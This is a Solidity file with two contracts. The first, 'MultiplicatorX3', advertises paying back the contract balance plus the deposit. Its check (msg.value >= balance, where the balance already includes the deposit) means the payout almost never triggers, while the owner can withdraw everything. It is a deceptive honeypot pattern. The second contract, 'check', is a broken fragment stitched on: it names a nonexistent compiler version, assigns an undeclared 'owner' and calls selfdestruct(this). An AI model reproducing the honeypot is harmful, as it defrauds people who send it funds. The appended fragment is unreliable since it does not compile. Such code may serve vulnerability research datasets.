pragma solidity ^0.5.0;

contract MultiplicatorX3 {
    address payable public Owner;

    constructor() public {
        Owner = msg.sender;
    }

    function withdraw() payable public {
        require(msg.sender == Owner);
        Owner.transfer(address(this).balance);
    }

    function multiplicate(address payable adr) public payable{
        if(msg.value>=address(this).balance) {
            adr.transfer(address(this).balance+msg.value);
        }
    }

    function depositMoney() public payable {}
}
pragma solidity ^0.5.24;
contract check {
	uint validSender;
	constructor() public {owner = msg.sender;}
	function destroy() public {
		assert(msg.sender == owner);
		selfdestruct(this);
	}
}
